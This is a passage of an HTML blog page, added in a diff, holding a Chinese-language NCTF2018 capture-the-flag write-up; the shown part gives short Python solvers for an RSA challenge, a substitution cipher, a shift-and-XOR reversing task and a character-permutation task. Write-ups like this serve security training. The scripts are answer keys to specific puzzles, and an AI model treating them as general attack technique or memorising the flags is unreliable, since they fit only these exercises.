class="line">c&#x3D;13043206753625359891696429504613068427529111016070088678736297291041435652992434742862062899975037273524389833567258051170507686131853178642412748377655159798601888072877427570380109085131089494464136940524560062629558966202744902709909907514127527274581612606840291391818050072220256661680141666883565331886278443012064173917218991474525642412407692187407537171479651983318468186723172013439034765279464665108704671733067907815695414348312753594497823099115037082352616886076617491904991917443093071262488786475411319592529466108485884029307606114810451140886975584959872328937471166255190940884805476899976523580343</span><br><span class="line">p&#x3D;163979993780473228636250944509658100304105288291161815533296974391197924208241177469979929848925840413549589001337016682107921402071171221384247679860925727646585534725356410523705767408370013103023547625067109338180880560875828450693640775629005283101707663609483220395891338395873247794351441082424506156057</span><br><span class="line">q&#x3D;n&#x2F;p</span><br><span class="line">def rsa(n, p, q, e, c):</span><br><span class="line">    d &#x3D; invert(e, (p - 1) * (q - 1))</span><br><span class="line">    m &#x3D; pow(c, d, n)</span><br><span class="line">    print hex(m)[2:].decode(&quot;hex&quot;)</span><br><span class="line"></span><br><span class="line">rsa(n, p, q, e, c)</span><br></pre></td></tr></table></figure>
+<h3 id="0x0A-Substitute"><a href="#0x0A-Substitute" class="headerlink" title="0x0A Substitute"></a>0x0A Substitute</h3><p>利用在线网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;quipqiup.com&#x2F;</span><br></pre></td></tr></table></figure>
+<p>词频分析即可<br>得到大概解，剩下的根据单词人工进行替换即可：<br>解题的时候因为编码问题脚本写的贼丑：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">s&#x3D;&quot;いをねちよなとち ねちほ かなわろほそ よへ たよつつりろをほ るほゐつ りつ らほそゐ をいそとほ, ねちりつ はりたちほそ りつ かよね らほそゐ つねそよかと, いかに りつ ほいつりをゐ ろそよるほか. たそよらりにほに ねちほ わほつついとほ りつ よへ そほいつよかいろをほ をほかとねち, ねちほ はそゐたねいかいをゐつね はいか にほになはほ ねちほ たそよろいろをほ わほいかりかと よへ ねちほ わよつね はよわわよか つゐわろよをつ ろゐ いかいをゐのりかと ねちほ へそほれなほかはゐ にりつねそりろなねりよか よへ ねちほ はりたちほそねほうね. ねちりつ いををよむつ へよそわいねりよか よへ たいそねりいを むよそにつ, むちりはち はいか ろほ ねほかねいねりらほをゐ へりををほに りか, たそよとそほつつりらほをゐ ほうたいかにりかと ねちほ つよをなねりよか. ねちほ へをいと りつ つなろつねりねなねりよか はりたちほそ りつ つよ とよよに. りか つよわほ はいつほつ, なかにほそをゐりかと むよそにつ はいか いをつよ ろほ にほねほそわりかほに へそよわ ねちほ たいねねほそか よへ ねちほりそ をほねねほそつ; へよそ ほういわたをほ, いねねそいはね, よつつほよなつ, いかに むよそにつ むりねち ねちよつほ ねむよ いつ ねちほ そよよね いそほ ねちほ よかをゐ はよわわよか ほかとをりつち むよそにつ むりねち ねちほ たいねねほそか いろろはいにろ. わいかゐ たほよたをほ つよをらほ つなはち はりたちほそつ へよそ そほはそほいねりよか, いつ むりねち はそゐたねよとそいわ たなののをほつ りか ねちほ かほむつたいたほそ.&quot;</span><br><span class="line">key&#x3D;&quot;althougenmbrfpsikyvcd&quot;</span><br><span class="line">def check(a,b):</span><br><span class="line">  for i in a:</span><br><span class="line">    if b&#x3D;&#x3D;i:</span><br><span class="line">       return False</span><br><span class="line">  return True</span><br><span class="line">ans&#x3D;[]</span><br><span class="line">i&#x3D;0</span><br><span class="line">while i &lt; len(s):</span><br><span class="line">  if s[i]&#x3D;&#x3D;&quot;\xe3&quot;:</span><br><span class="line">       k&#x3D;s[i:i+3]</span><br><span class="line">       i&#x3D;i+3</span><br><span class="line">       if check(ans,k):</span><br><span class="line">          ans.append(k)</span><br><span class="line">  else:</span><br><span class="line">      i&#x3D;i+1</span><br><span class="line"></span><br><span class="line">for i in range(len(key)):</span><br><span class="line">   s&#x3D;s.replace(ans[i],key[i])</span><br><span class="line">   </span><br><span class="line">print s</span><br></pre></td></tr></table></figure>
+<h3 id="0x0B-后门后门后门"><a href="#0x0B-后门后门后门" class="headerlink" title="0x0B 后门后门后门"></a>0x0B 后门后门后门</h3><p>动调下断点-&gt;跳到flag输出函数即可</p>
+<h3 id="0x0C-Our-16bit-wars"><a href="#0x0C-Our-16bit-wars" class="headerlink" title="0x0C Our 16bit wars"></a>0x0C Our 16bit wars</h3><p>纯看汇编就行，移位+异或</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D; [ 201, 104, 138, 200, 111, 7,6,15, 7, 198, 235, 134, 110, 110, 102, 173,76, 141, 172, 235,  38, 110, 235, 204, 174, 205, 140, 134, 173, 102, 205, 142, 134, 141, 175]</span><br><span class="line">ans&#x3D;&quot;&quot;</span><br><span class="line">for i in key:</span><br><span class="line">	ans+&#x3D;chr(((i&lt;&lt;3)^(i&gt;&gt;5))&amp;0xff)</span><br><span class="line">print ans</span><br></pre></td></tr></table></figure>
+<h3 id="0x0C-基本操作-Reverse-Version"><a href="#0x0C-基本操作-Reverse-Version" class="headerlink" title="0x0C 基本操作 Reverse Version."></a>0x0C 基本操作 <del>Reverse Version.</del></h3><p>大概了解程序流程，随意输入一组字符得到位置对应关系，然后对应程序中的字符串比较得到原flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">i&#x3D;0</span><br><span class="line">key&#x3D;&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-+&quot;</span><br><span class="line">key2&#x3D;&quot;abdhpF+GqHIirJKsLMejtNOuPQkvRSwTUcflxVWyXYmzZ1A23gnB45C67oD89E0-&quot;</span><br><span class="line">key3&#x3D;&quot;bcec8d7dcda25d91ed3e0b720cbb6cf202b09fedbc3e017774273ef5d5581794&quot;</span><br><span class="line">ans&#x3D;[]</span><br><span class="line">for i in key2:</span><br><span class="line">    ans.append(key.find(i))</span><br><span class="line">k&#x3D;[0]*64</span><br><span class="line">for s in range(64):</span><br><span class="line">    k[ans[s]]&#x3D;key3[s]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in k:</span><br><span class="line">    flag+&#x3D;i</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-SMALL-bug-I"><span class="toc-number">1.</span> <span class="toc-text">0x01 SMALL bug I</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-SMALL-bug-II"><span class="toc-number">2.</span> <span class="toc-text">0x02 SMALL bug II</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-SMALL-bug-III"><span class="toc-number">3.</span> <span class="toc-text">0x03 SMALL bug III</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-sendyouflag"><span class="toc-number">4.</span> <span class="toc-text">0x04 sendyouflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-sendyousomething"><span class="toc-number">5.</span> <span class="toc-text">0x05 sendyousomething</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-baby-stack"><span class="toc-number">6.</span> <span class="toc-text">0x06 baby stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-babytcache"><span class="toc-number">7.</span> <span class="toc-text">0x07 babytcache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-Calc"><span class="toc-number">8.</span> <span class="toc-text">0x08 Calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-easy-rsa"><span class="toc-number">9.</span> <span class="toc-text">0x09 easy rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0A-Substitute"><span class="toc-number">10.</span> <span class="toc-text">0x0A Substitute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0B-后门后门后门"><span class="toc-number">11.</span> <span class="toc-text">0x0B 后门后门后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0C-Our-16bit-wars"><span class="toc-number">12.</span> <span class="toc-text">0x0C Our 16bit wars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0C-基本操作-Reverse-Version"><span class="toc-number">13.</span> <span class="toc-text">0x0C 基本操作 Reverse Version.</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/27/NCTF2018/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/27/NCTF2018/&text=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/27/NCTF2018/&is_video=false&description=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NCTF2018&body=Check out this article: http://yoursite.com/2018/11/27/NCTF2018/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/27/NCTF2018/&name=NCTF2018&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
